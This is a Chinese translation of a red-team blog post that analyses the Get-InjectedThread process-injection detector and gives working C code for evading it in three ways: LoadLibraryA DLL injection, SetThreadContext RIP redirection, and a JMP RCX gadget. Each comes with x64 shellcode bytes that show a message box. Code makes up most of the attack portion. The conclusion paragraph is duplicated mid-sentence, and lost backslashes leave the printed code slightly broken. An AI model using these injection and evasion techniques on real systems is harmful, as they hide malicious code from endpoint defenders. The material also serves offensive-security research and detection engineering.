@@ -1,0 +1,433 @@
+# 深入分析Get-InjectedThread进程注入检测工具的原理并尝试绕过
+
+阅读量 **215523**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-04-11 14:06:10
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 xpn，文章来源：blog.xpnsec.com
+
+原文地址：<https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t015035a80d4a33bbdf.jpg)
+
+## 前言
+
+在安全这个领域，我非常热衷于红蓝对抗这样的“猫鼠大战”，在比赛过程中，双方会迫使对方去尽全力投入比赛。通常，有许多非常厉害的工具不断发布，这些工具就可以帮助防守方检测恶意软件或监测Shellcode是否已经被执行。而对于红方（攻击方）而言，如果想要进行一次成功的渗透，那么了解这些防御工具的功能就至关重要。  
+最近，我阅读了一篇非常不错的文章《Defenders Think in Graphs
+Too!》，该文章可以在SpectreOps的博客上找到。这篇文章是一个系列专题的开篇，主要研究进程注入检测的案例，并进行数据采集、数据评估和数据分析。如果你还没有读过，我强烈建议你首先阅读这篇文章。  
+在该文章中，讨论了一个名为“Get-InjectedThread”的工具，该工具是一个PowerShell脚本，能够列举当前正在运行的进程，检测并显示可能已经被进程注入的可疑进程。这一工具可以在GitHub下载。  
+当我看到这一工具时，我想的第一件事就是，如果在对抗期间遇到了这样的工具，应该如何绕过它的检测。此外，由于我对Windows安全这一领域比较感兴趣，所以我希望能够在这一工具的基础上，对Get-InjectedThread进行改进和迭代，或者开发出来原理类似的其他工具。本文将主要采用几种不同的技术，来帮助大家理解并掌握如何绕过此类分析。
+
+## 初尝试：如何绕过检测
+
+通常，当我们试图在另一个进程中执行代码时，会使用VirtualAllocEx -> WriteProcessMemory ->
+CreateRemoteThread这条链。那么，让我们看看Get-InjectedThread是如何实际使用的。首先将Shellcode注入进程，随后运行Get-InjectedThread：  
+由此可见，Get-InjectedThread的效果确实不错。在这里，我们看到注入到cmd.exe中的Shellcode已经被捕获到，并且显示了出来，这就说明该进程是非常可疑的。Get-InjectedThread之所以能够实现这一点，是因为它会对系统上正在运行的线程进行分析。随后，会遍历与线程起始地址相关联的内存区域，如果发现内存中缺少MEM_IMAGE标志，那么该工具会提示该线程很可能是从动态分配的内存中运行（很可能来自VirtualAllocEx或类似调用），而不是从DLL或EXE中派生出来。  
+现在，我们查看一下它的代码，来看看究竟是如何进行这些检查工作的：
+
+    
+    
+    function Get-InjectedThread
+    {
+    ...
+    $hSnapshot = CreateToolhelp32Snapshot -ProcessId 0 -Flags 4
+    
+    $Thread = Thread32First -SnapshotHandle $hSnapshot
+    do
+    {
+        $proc = Get-Process -Id $Thread.th32OwnerProcessId
+    
+        if($Thread.th32OwnerProcessId -ne 0 -and $Thread.th32OwnerProcessId -ne 4)
+        {
+            $hThread = OpenThread -ThreadId $Thread.th32ThreadID -DesiredAccess $THREAD_ALL_ACCESS -InheritHandle $false
+            if($hThread -ne 0)
+            {
+                $BaseAddress = NtQueryInformationThread -ThreadHandle $hThread
+                $hProcess = OpenProcess -ProcessId $Thread.th32OwnerProcessID -DesiredAccess $PROCESS_ALL_ACCESS -InheritHandle $false
+    
+                if($hProcess -ne 0)
+                {
+                    $memory_basic_info = VirtualQueryEx -ProcessHandle $hProcess -BaseAddress $BaseAddress
+                    $AllocatedMemoryProtection = $memory_basic_info.AllocationProtect -as $MemProtection
+                    $MemoryProtection = $memory_basic_info.Protect -as $MemProtection
+                    $MemoryState = $memory_basic_info.State -as $MemState
+                    $MemoryType = $memory_basic_info.Type -as $MemType
+    
+                    if($MemoryState -eq $MemState::MEM_COMMIT -and $MemoryType -ne $MemType::MEM_IMAGE)
+                    {   
+                    ...
+    
+
+在上述代码中，有几个地方需要我们重点关注。首先是：
+
+    
+    
+    $BaseAddress = NtQueryInformationThread -ThreadHandle $hThread
+    
+
+该命令负责检索正在运行的线程的入口地址。在注入Shellcode时，通常会是提供给CreateRemoteThread调用的地址。例如：
+
+    
+    
+    threadHandle = CreateRemoteThread(
+        processHandle, 
+        NULL, 
+        0, 
+        BASE_ADDRESS, 
+        NULL, 
+        CREATE_SUSPENDED, 
+        NULL
+    );
+    
+
+接下来一个有意思的调用是：
+
+    
+    
+    $memory_basic_info = VirtualQueryEx -ProcessHandle $hProcess -BaseAddress $BaseAddress
+    
+
+这一行代码是在调用Win32函数VirtualQueryEx，该函数会返回与正在运行线程的基地址相关的内存分配信息，其中包括内存保护、大小、标志等等。  
+得到该信息后，会用于以下命令中：
+
+    
+    
+    if($MemoryState -eq $MemState::MEM_COMMIT -and $MemoryType -ne $MemType::MEM_IMAGE)
+    
+
+在这里我们看到有一个最终的检查，会检查线程的基地址是否存在MEM_COMMIT标志且缺少MEM_IMAGE标志。如果判断为真，那么该线程就很可能是从动态内存中注入并运行的，工具将突出显示该线程以提醒用户。  
+在了解上述原理之后，我们来看看是否有方法可以绕过这些检查，同时还得保证该工具处于正常运行状态之下。
+
+## 通过LoadLibrary注入DLL
+
+要避免被该工具发现，我们选择的第一种方法是将Shellcode添加到DLL中，然后使用LoadLibraryA作为我们的入口点。通过这样，我们能绕过下述检查，因为入口点现在已经在MEM_IMAGE标记的内存中：
+
+    
+    
+    if($MemoryState -eq $MemState::MEM_COMMIT -and $MemoryType -ne $MemType::MEM_IMAGE)
+    
+
+要定位LoadLibraryA，我们需要进行如下步骤：  
+1、获取LoadLibraryA调用的地址；  
+2、在目标进程中分配内存；  
+3、将我们DLL的路径写入分配的内存中；  
+4、调用启动一个新线程，入口点为LoadLibraryA，将DLL路径内存地址作为参数传递。  
+具体实现如下：
+
+    
+    
+    int example_loadlibrary(int pid) {
+    
+        char currentDir[MAX_PATH];
+        SIZE_T bytesWritten = 0;
+    
+        HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+        if (processHandle == INVALID_HANDLE_VALUE) {
+            printf("[X] Error: Could not open process with PID %dn", pid);
+            return 1;
+        }
+    
+        void *alloc = VirtualAllocEx(processHandle, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (alloc == NULL) {
+            printf("[X] Error: Could not allocate memory in processn");
+            return 1;
+        }
+    
+        void *_loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
+        if (_loadLibrary == NULL) {
+            printf("[X] Error: Could not find address of LoadLibraryn");
+            return 1;
+        }
+    
+        GetCurrentDirectoryA(MAX_PATH, currentDir);
+        strncat_s(currentDir, "\injectme.dll", MAX_PATH);
+    
+        printf("[*] Injecting path to load DLL: %sn", currentDir);
+    
+        if (!WriteProcessMemory(processHandle, alloc, currentDir, strlen(currentDir) + 1, &bytesWritten)) {
+            printf("[X] Error: Could not write into process memoryn");
+            return 2;
+        }
+        printf("[*] Written %d bytesn", bytesWritten);
+    
+        if (CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)_loadLibrary, alloc, 0, NULL) == NULL) {
+            printf("[X] Error: CreateRemoteThread failed [%d] :(n", GetLastError());
+            return 2;
+        }
+    }
+    
+
+我们尝试让注入的DLL能够调用MessageBoxA来证明是否成功：  
+  
+在这里能看到，我们已经成功地将我们的Shellcode注入了cmd.exe，随后弹出了消息框。重要的是，这次注入过程没有被Get-InjectedThread监测到。  
+当然，这种方法有一个明显的缺点，就是我们要将一个DLL放到磁盘上来执行注入，这样一来就增大了我们Shellcode被发现的风险。这是一个不错的开头，但我们还需要尝试能否解决这一问题。
+
+## SetThreadContext
+
+我们现在知道，避免被捕获的一个好方法是将线程的入口地址设置为带有MEM_IMAGE标志的内存区域中。但是，如果我们在启动之前更新线程的入口点，这样能够逃避检测吗？  
+在接下来的尝试中，我们打算利用SetThreadContext调用，将执行流重定向到我们注入的Shellcode，主要分为以下几个步骤：  
+1、在目标进程中分配内存，以存储我们的Shellcode；  
+2、将Shellcode复制到分配的内存中；  
+3、派生一个挂起的线程，并将ThreadProc设置为任意带有MEM_IMAGE标志的内存区域；  
+4、对挂起的线程进行检索，查找当前的寄存器；  
+5、更新RIP寄存器，指向存储在分配内存中的Shellcode；  
+6、恢复执行。  
+通过上述方法，尽管我们还没有真正从带有MEM_IMAGE标志的内存区域的地址执行代码，但线程的基地址将是这一地址。然后，通过对RIP寄存器进行修改，使其指向我们的Shellcode，从而实现了Shellcode的执行，同时也绕过了Get-InjectedThread。我们的代码如下：
+
+    
+    
+    unsigned char shellcode[256] = {
+        0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x31, 0xc9, 0x48, 0x8d, 0x15,
+        0x14, 0x00, 0x00, 0x00, 0x49, 0x89, 0xd0, 0x4d, 0x31, 0xc9,
+        0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+        0xff, 0xd0, 0xeb, 0xfe, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64,
+        0x20, 0x54, 0x65, 0x73, 0x74, 0x00, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff
+    };
+    
+    int example_switchsuspend(int pid) {
+        char currentDir[MAX_PATH];
+        SIZE_T bytesWritten = 0;
+        HANDLE threadHandle;
+    
+        HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+        if (processHandle == INVALID_HANDLE_VALUE) {
+            printf("[X] Error: Could not open process with PID %dn", pid);
+            return 1;
+        }
+    
+        void *alloc = VirtualAllocEx(processHandle, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (alloc == NULL) {
+            printf("[X] Error: Could not allocate memory in processn");
+            return 1;
+        }
+    
+        void *_loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
+        if (_loadLibrary == NULL) {
+            printf("[X] Error: Could not find address of LoadLibraryn");
+            return 1;
+        }
+    
+        *(DWORD64 *)(shellcode + 26) = (DWORD64)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA");
+    
+        if (!WriteProcessMemory(processHandle, alloc, shellcode, sizeof(shellcode), &bytesWritten)) {
+            printf("[X] Error: Could not write to process memoryn");
+            return 2;
+        }
+        printf("[*] Written %d bytes to %pn", bytesWritten, alloc);
+    
+        threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)_loadLibrary, NULL, CREATE_SUSPENDED, NULL);
+        if (threadHandle == NULL) {
+            printf("[X] Error: CreateRemoteThread failed [%d] :(n", GetLastError());
+            return 2;
+        }
+    
+        // Get the current registers set for our thread
+        CONTEXT ctx;
+        ZeroMemory(&ctx, sizeof(CONTEXT));
+        ctx.ContextFlags = CONTEXT_CONTROL;
+        GetThreadContext(threadHandle, &ctx);
+    
+        printf("[*] RIP register set to %pn", ctx.Rip);
+        printf("[*] Updating RIP to point to our shellcoden");
+        ctx.Rip = (DWORD64)alloc;
+    
+        printf("[*] Resuming thread execution at our shellcode addressn");
+        SetThreadContext(threadHandle, &ctx);
+        ResumeThread(threadHandle);
+    }
+    
+
+运行后，证明了第二种执行Shellcode的方法是可行的，可以将我们的线程注入到notepad.exe中：
+
+![](https://blog.xpnsec.com/content/images/2018/04/bypass2.png)
+
+## 返回导向线程
+
+大家可能了解返回导向编程（Return-oriented
+Programming），这是一种高级的内存攻击技术，可以绕过现代操作系统的各种通用防御。而在这里我们说的是返回导向线程（Return Oriented
+Threading），我们要利用现有的带有MEM_IMAGE的二进制文件中的指令，将执行传递给我们的Shellcode。因此我们的思路大致如下：  
+1、在目标进程中分配内存，存储我们的Shellcode；  
+2、将Shellcode复制到分配的内存中；  
+3、在目标进程中寻找一个“小工具”，从而让线程跳转到Shellcode中；  
+4、用指向这一“小工具”的ThreadProc启动我们的线程。  
+目前已经知道，需要使用CreateRemoteThread调用来执行我们的线程，该调用会执行ThreadProc的地址。同时，我们可以将可选的参数传递给ThreadProc。  
+在x64进程中，参数会被传入rcx寄存器。那么，我们的”小工具”是否可以是jmp rcx呢？  
+这样一来，我们可以将ThreadProc的地址设置为jmp
+rcx，并将Shellcode的地址作为参数。同时，这样也能确保线程的基地址位于MEM_IMAGE的内存区域中，应该能够绕过检测。  
+下面是该方案具体实现的示例：
+
+    
+    
+    unsigned char shellcode[256] = {
+        0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x31, 0xc9, 0x48, 0x8d, 0x15,
+        0x14, 0x00, 0x00, 0x00, 0x49, 0x89, 0xd0, 0x4d, 0x31, 0xc9,
+        0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+        0xff, 0xd0, 0xeb, 0xfe, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64,
+        0x20, 0x54, 0x65, 0x73, 0x74, 0x00, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0xff, 0xff
+    };
+    
+    int example_rop(int pid) {
+        char currentDir[MAX_PATH], buffer[4096];
+        SIZE_T bytesWritten = 0, bytesRead = 0;
+        HANDLE threadHandle;
+        DWORD i = 0, j = 0, threadId = 0;
+        void *retGadget = NULL;
+    
+        HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+        if (processHandle == INVALID_HANDLE_VALUE) {
+            printf("[X] Error: Could not open process with PID %dn", pid);
+            return 1;
+        }
+    
+        void *alloc = VirtualAllocEx(processHandle, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (alloc == NULL) {
+            printf("[X] Error: Could not allocate memory in processn");
+            return 1;
+        }
+    
+        // Update our MessageBoxA shellcode with the API address
+        *(DWORD64 *)(shellcode + 26) = (DWORD64)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA");
+    
+        // Test victim process, VBoxTray
+        char *base = (char *)LoadLibraryA("VBoxTray.exe");
+        if (base == NULL) {
+            printf("[X] Could not load DLLn");
+            return 2;
+        }
+    
+        // Hunting for a JMP RCX (xffxe1) instruction
+        for (i = 0; i < 100000 && retGadget == NULL; i += bytesRead) {
+            printf("[*] Hunting for gadget at address %pn", (char *)base + i);
+            ReadProcessMemory(processHandle, (char *)base + i, buffer, 4096, &bytesRead);
+            for (j = 0; j + 1 < bytesRead && retGadget == NULL; j++) {
+                if (buffer[j] == 'xff' && buffer[j+1] == 'xe1') {
+                    retGadget = (char *)base + i + j;
+                }
+            }
+        }
+    
+        if (retGadget == NULL) {
+            printf("[X] Error: Could not find JMP gadgetn");
+            return 2;
+        }
+    
+        printf("[*] Found JMP RCX gadget at address %pn", retGadget);
+    
+        if (!WriteProcessMemory(processHandle, alloc, shellcode, sizeof(shellcode), &bytesWritten)) {
+            printf("[X] Error writing shellcode into memoryn");
+            return 2;
+        }
+        printf("[*] Written %d bytes of shellcode to %pn", bytesWritten, alloc);
+    
+        printf("[*] Starting thread executionn");
+        threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)((char*)retGadget), alloc, 0, &threadId);
+        if (threadHandle == NULL) {
+            printf("[X] Error: CreateRemoteThread failed [%d] :(n", GetLastError());
+            return 2;
+        }
+    
+        printf("[*] Thread ID %x createdn", threadId);
+    }
+    
+
+当我们执行后，发现Shellcode成功运行，同时也没有产生告警：
+
+![](https://blog.xpnsec.com/content/images/2018/04/bypass3.png)
+
+## 总结
+
+这样一来，就大功告成了。我们发现有几种不同的方法可以派生出线程，同时隐藏实际的开始地址。如果你遇到了类似的检测技术，也可以尝试采用这样的方法来进行绕过。当然，如果你能够借助Get-InjectedThreads检测到上述示例的注入过程，希望能与我交这样一来，就大功告成了。我们发现有几种不同的方法可以派生出线程，同时隐藏实际的开始地址。如果你遇到了类似的检测技术，也可以尝试采用这样的方法来进行绕过。当然，如果你能够借助Get-InjectedThreads检测到上述示例的注入过程，希望能与我交流讨论！
+
+## 扩展阅读
+
+[1] Get-InjectedThreads：  
+<https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2>  
+[2] EndGame – Hunting in memory：  
+<https://www.endgame.com/blog/technical-blog/hunting-memory>  
+[3] Hunting in memory presentation：  
+<https://www.sans.org/summit-archives/file/summit-archive-1492714038.pdf>  
+[4] 关于ROP（返回导向编程）技术：  
+<https://www.anquanke.com/post/id/85619>
+
+本文翻译自blog.xpnsec.com [原文链接](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **P!chu** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/104339](/post/id/104339)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [blog.xpnsec.com](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/)
+
+如若转载,请注明出处： <https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [恶意软件](/tag/恶意软件)
+  * [进程注入](/tag/进程注入)
+  * [红蓝对抗](/tag/红蓝对抗)
+  * [绕过检测](/tag/绕过检测)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
